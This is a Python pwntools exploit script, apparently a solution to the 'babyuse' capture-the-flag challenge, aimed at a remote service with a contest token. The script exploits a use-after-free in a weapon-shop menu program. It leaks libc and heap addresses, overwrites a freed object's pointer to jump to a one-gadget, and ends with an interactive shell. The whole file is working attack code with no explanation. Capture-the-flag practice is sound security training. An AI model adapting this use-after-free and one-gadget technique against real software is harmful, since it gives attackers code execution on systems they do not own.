#!/usr/bin/python
from pwn import *

local = False
if local:
  p = process('./babyuse')
else:
  p = remote('202.112.51.247', 3456)
  p.recvuntil('Token:')
  p.sendline('nXFrEmwytKR3YoxAKnfXBCINvBu0hiyk')

def buy(length, name):
  p.recvuntil('7. Exit')
  p.sendline('1')
  p.recvuntil('QBZ95')
  p.sendline('1')
  p.recvuntil('name') 
  p.sendline(str(length))
  p.recvuntil('name:')
  p.sendline(name)

def select(idx):
  p.recvuntil('7. Exit')
  p.sendline('2')
  p.recvuntil('gun')
  p.sendline(str(idx))

def rename(idx, length, name):
  p.recvuntil('7. Exit')
  p.sendline('4')
  p.recvuntil('rename:')
  p.sendline(str(idx))
  p.recvuntil('name')
  p.sendline(str(length))
  p.recvuntil('name:')
  p.sendline(name)

def use():
  p.recvuntil('7. Exit')
  p.sendline('5')

def drop(idx):
  p.recvuntil('7. Exit')
  p.sendline('6')
  p.recvuntil('delete:')
  p.sendline(str(idx))

buy(256, 'a'*256)
buy(256, 'b'*256)
select(0)
drop(0)
use()

leak = u32(p.recvuntil('a')[-5:-1])
if local:
  base = leak - 0x1b07b0
  pheap = base + 0x1b0150
  magic = base + 0x3a819
else:
  base = leak - 0x1b27b0
  pheap = base + 0x1b2150
  magic = base + 0x3ac69

print hex(base)
print hex(pheap)
print hex(magic)

p.sendline('4')
raw_input()
rename(1, 16, p32(pheap+1)*2)
use()

p.recvuntil('gun ')
heap = u32('\x00' + p.recvn(3))

print hex(heap)
p.sendline('4')

buy(256, 'c'*256)
drop(0)

rename(1, 16, p32(heap + 0x4a00 + 0x24) + p32(magic))
use()

p.interactive()

  
